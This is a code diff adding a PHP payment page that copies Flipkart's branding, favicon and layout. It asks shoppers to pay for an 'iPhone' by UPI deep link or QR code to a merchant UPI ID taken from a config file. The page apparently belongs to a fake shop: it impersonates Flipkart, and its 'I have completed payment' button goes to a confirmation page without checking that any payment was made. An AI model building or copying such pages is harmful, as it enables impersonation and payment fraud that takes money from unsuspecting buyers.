@@ -1,0 +1,325 @@
+<?php
+require_once __DIR__ . '/config.php';
+
+$formattedPrice = number_format($iphonePrice);
+$encodedUpiId = rawurlencode($upiId);
+$encodedMerchant = rawurlencode($merchantName);
+$encodedNote = rawurlencode("Payment for iPhone");
+$upiUrl = "upi://pay?pa={$encodedUpiId}&pn={$encodedMerchant}&am={$iphonePrice}&cu=INR&tn={$encodedNote}";
+$qrCodeUrl = "https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=" . urlencode($upiUrl);
+?>
+<!DOCTYPE html>
+<html lang="en-IN">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,minimum-scale=1,user-scalable=no" />
+    <link rel="icon" href="https://static-assets-web.flixcart.com/batman-returns/batman-returns/p/images/logo_lite-cbb357.png" />
+    <title>UPI Payment - Flipkart</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" />
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+
+    <style>
+      * { margin: 0; padding: 0; box-sizing: border-box; }
+      body {
+        font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif;
+        background: #f1f3f6;
+        color: #212121;
+        padding-bottom: 80px;
+      }
+      .payment-wrap {
+        max-width: 520px;
+        margin: 0 auto;
+        background: #f1f3f6;
+      }
+      .fk-header {
+        background: #2874f0;
+        color: #fff;
+        padding: 12px 14px;
+        display: flex;
+        align-items: center;
+        gap: 12px;
+      }
+      .fk-header a {
+        color: #fff;
+        font-size: 18px;
+        text-decoration: none;
+      }
+      .fk-header-title {
+        font-size: 15px;
+        font-weight: 600;
+        flex: 1;
+      }
+      .amount-banner {
+        background: #fff;
+        padding: 14px 16px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        border-bottom: 1px solid #e0e0e0;
+      }
+      .amount-banner .label {
+        font-size: 13px;
+        color: #878787;
+        font-weight: 500;
+      }
+      .amount-banner .prod-name {
+        font-size: 14px;
+        font-weight: 700;
+        color: #212121;
+      }
+      .amount-banner .value {
+        font-size: 20px;
+        font-weight: 800;
+        color: #2874f0;
+      }
+
+      .method-card {
+        background: #fff;
+        margin-top: 10px;
+        padding: 16px;
+        box-shadow: 0 1px 3px rgba(0,0,0,0.06);
+        border-radius: 4px;
+      }
+      .method-header {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        margin-bottom: 12px;
+      }
+      .method-radio {
+        width: 18px;
+        height: 18px;
+        accent-color: #2874f0;
+      }
+      .method-title {
+        font-size: 15px;
+        font-weight: 700;
+        color: #212121;
+      }
+      .method-subtitle {
+        font-size: 12px;
+        color: #878787;
+        margin-left: 28px;
+        margin-bottom: 16px;
+      }
+
+      .upi-apps-grid {
+        display: grid;
+        grid-template-columns: repeat(4, 1fr);
+        gap: 10px;
+        margin: 16px 0;
+      }
+      .upi-app-btn {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        background: #f8f9fa;
+        border: 1px solid #e0e0e0;
+        border-radius: 8px;
+        padding: 10px 4px;
+        text-decoration: none;
+        color: #212121;
+        cursor: pointer;
+        transition: all 0.15s ease;
+      }
+      .upi-app-btn:active {
+        transform: scale(0.96);
+        background: #eef2fa;
+        border-color: #2874f0;
+      }
+      .upi-app-icon {
+        width: 38px;
+        height: 38px;
+        border-radius: 8px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 20px;
+        margin-bottom: 6px;
+        background: #fff;
+        box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+      }
+      .upi-app-name {
+        font-size: 11px;
+        font-weight: 600;
+        text-align: center;
+      }
+
+      .pay-primary-btn {
+        width: 100%;
+        background: #fb641b;
+        color: #fff;
+        border: none;
+        padding: 14px 20px;
+        font-size: 16px;
+        font-weight: 700;
+        border-radius: 4px;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+        text-decoration: none;
+        box-shadow: 0 2px 6px rgba(251, 100, 27, 0.35);
+        margin-top: 14px;
+      }
+      .pay-primary-btn:hover, .pay-primary-btn:active {
+        background: #e45713;
+        color: #fff;
+      }
+
+      .upi-details-box {
+        margin-top: 16px;
+        padding: 12px;
+        background: #fafafa;
+        border: 1px dashed #d5d9d9;
+        border-radius: 6px;
+        text-align: center;
+      }
+      .upi-id-tag {
+        font-family: monospace;
+        font-size: 13px;
+        font-weight: 600;
+        color: #2874f0;
+        background: #eef4fe;
+        padding: 4px 8px;
+        border-radius: 4px;
+        display: inline-block;
+        margin: 4px 0;
+      }
+      .qr-wrapper {
+        margin: 12px auto;
+        text-align: center;
+      }
+      .qr-img {
+        width: 150px;
+        height: 150px;
+        border: 1px solid #e0e0e0;
+        padding: 6px;
+        background: #fff;
+        border-radius: 6px;
+      }
+
+      .confirm-action {
+        margin-top: 16px;
+        text-align: center;
+      }
+      .btn-verify {
+        display: inline-flex;
+        align-items: center;
+        gap: 6px;
+        background: #fff;
+        color: #26a541;
+        border: 1.5px solid #26a541;
+        padding: 9px 18px;
+        border-radius: 4px;
+        font-size: 13px;
+        font-weight: 600;
+        text-decoration: none;
+        cursor: pointer;
+      }
+      .btn-verify:hover {
+        background: #f4fbf5;
+        color: #26a541;
+      }
+
+      .security-box {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+        padding: 16px;
+        color: #878787;
+        font-size: 12px;
+      }
+      .security-box i {
+        font-size: 18px;
+        color: #26a541;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="payment-wrap">
+      <div class="fk-header">
+        <a href="checkout.php"><i class="bi bi-arrow-left"></i></a>
+        <div class="fk-header-title">Payments</div>
+      </div>
+
+      <div class="amount-banner">
+        <div>
+          <div class="label">Amount to Pay</div>
+          <div class="prod-name">iPhone</div>
+        </div>
+        <div class="value">₹<?php echo $formattedPrice; ?></div>
+      </div>
+
+      <div class="method-card">
+        <div class="method-header">
+          <input type="radio" checked class="method-radio" name="payment_method" id="upiMethod" />
+          <label for="upiMethod" class="method-title">UPI Payment</label>
+        </div>
+        <div class="method-subtitle">Pay securely using any UPI App (Google Pay, PhonePe, Paytm, etc.)</div>
+
+        <!-- Single Primary Payment Button with amount directly from $iphonePrice -->
+        <a href="<?php echo htmlspecialchars($upiUrl); ?>" id="payBtn" class="pay-primary-btn">
+          <i class="bi bi-shield-lock-fill"></i> Pay ₹<?php echo $formattedPrice; ?>
+        </a>
+
+        <!-- UPI App Selection Grid -->
+        <div class="upi-apps-grid">
+          <a href="<?php echo htmlspecialchars($upiUrl); ?>" class="upi-app-btn" title="Google Pay">
+            <div class="upi-app-icon" style="color: #4285f4;"><i class="bi bi-google"></i></div>
+            <span class="upi-app-name">GPay</span>
+          </a>
+          <a href="<?php echo htmlspecialchars($upiUrl); ?>" class="upi-app-btn" title="PhonePe">
+            <div class="upi-app-icon" style="color: #5f259f;"><i class="bi bi-phone-fill"></i></div>
+            <span class="upi-app-name">PhonePe</span>
+          </a>
+          <a href="<?php echo htmlspecialchars($upiUrl); ?>" class="upi-app-btn" title="Paytm">
+            <div class="upi-app-icon" style="color: #00b9f5;"><i class="bi bi-wallet2"></i></div>
+            <span class="upi-app-name">Paytm</span>
+          </a>
+          <a href="<?php echo htmlspecialchars($upiUrl); ?>" class="upi-app-btn" title="Other UPI Apps">
+            <div class="upi-app-icon" style="color: #ea4335;"><i class="bi bi-upc-scan"></i></div>
+            <span class="upi-app-name">Any UPI</span>
+          </a>
+        </div>
+
+        <!-- UPI Details & QR -->
+        <div class="upi-details-box">
+          <div style="font-size: 12px; color: #555;">Merchant: <b><?php echo htmlspecialchars($merchantName); ?></b></div>
+          <div style="font-size: 12px; color: #777; margin-top: 4px;">UPI ID:</div>
+          <div class="upi-id-tag"><?php echo htmlspecialchars($upiId); ?></div>
+
+          <div class="qr-wrapper">
+            <img src="<?php echo htmlspecialchars($qrCodeUrl); ?>" class="qr-img" alt="Scan to Pay" />
+            <div style="font-size: 11px; color: #878787; margin-top: 4px;">Scan with any UPI app on phone</div>
+          </div>
+
+          <div class="confirm-action">
+            <a href="confirmation.php" class="btn-verify">
+              <i class="bi bi-check2-circle"></i> I have completed payment
+            </a>
+          </div>
+        </div>
+      </div>
+
+      <div class="security-box">
+        <i class="bi bi-shield-check"></i>
+        <span>100% Safe and Secure Payments Powered by UPI</span>
+      </div>
+    </div>
+
+    <script>
+      // Automatically attempt UPI link when tapped or on mobile
+      document.getElementById('payBtn').addEventListener('click', function(e) {
+        // Deep link will open UPI chooser on mobile devices
+        console.log("Triggering UPI payment link: <?php echo $upiUrl; ?>");
+      });
+    </script>
+  </body>
+</html>
